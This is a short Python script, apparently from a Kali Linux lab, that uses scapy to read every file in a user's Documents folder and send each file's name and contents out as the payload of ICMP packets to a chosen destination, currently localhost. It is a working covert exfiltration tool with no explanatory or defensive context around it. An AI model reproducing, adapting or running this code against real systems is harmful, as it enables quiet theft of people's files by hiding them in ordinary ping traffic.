from scapy.all import *
import os

def send_file(destination, file_path):
    with open(file_path, "rb") as f:
        file_content = f.read()

    # Nom du fichier suivi du contenu, séparés par une barre verticale
    payload = os.path.basename(file_path) + "|" + file_content.decode()

    # Envoi du paquet ICMP
    packet = IP(dst=destination)/ICMP()/Raw(load=payload)
    send(packet)

def send_directory(destination, directory_path):
    for item in os.listdir(directory_path):
        item_path = os.path.join(directory_path, item)
        if os.path.isfile(item_path):
            send_file(destination, item_path)

send_directory("127.0.0.1", "/home/kali/Documents")